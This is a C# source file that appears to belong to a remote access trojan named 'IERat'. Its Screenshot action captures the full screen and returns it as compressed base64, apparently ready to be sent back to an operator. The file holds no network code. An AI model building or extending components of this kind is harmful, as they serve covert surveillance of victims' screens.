using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Windows.Forms;

namespace IERat.lib.Actions
{
    class Screenshot
    {
        public static string Collect()
        {
            Rectangle bounds = Screen.GetBounds(Point.Empty);
            var imgStream = new MemoryStream();
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    bitmap.Save(imgStream, ImageFormat.Jpeg);
                }
            }
            return Convert.ToBase64String(Utils.Compress(imgStream.ToArray()));
        }
    }
}
